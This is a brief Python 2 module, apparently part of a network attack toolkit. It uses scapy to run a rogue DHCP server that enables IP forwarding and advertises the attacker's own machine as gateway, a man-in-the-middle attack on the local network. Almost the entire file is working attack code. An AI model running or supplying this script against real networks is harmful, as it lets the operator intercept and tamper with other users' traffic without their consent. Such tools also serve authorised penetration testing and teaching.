'''
    DHCP attacks module
'''
from scapy.all import *
from time import sleep
import ip_misc

def initialize():
    conf.verb = 1
    global my_ip
    iface = raw_input('Interface [eth0]:') or 'eth0'
    conf.iface = iface
    my_ip = get_if_addr(iface)
    ip_misc.enable_forward()

'''
Performs a rogue DHCP server MITM attack
'''
def rogue_dhcp():
    initialize()
    dhcp_server = DHCP_am(domain='xx.xx', pool=Net(my_ip+'/24'),
                          network=my_ip+'/24', gw=my_ip,
                          renewal_time=600, lease_time=3600)
    print 'Now answering DHCP requests, press Ctrl+C to stop...\n'
    dhcp_server()
    ip_misc.disable_forward()
    conf.verb = 0
    print 'Attack stopped\n'
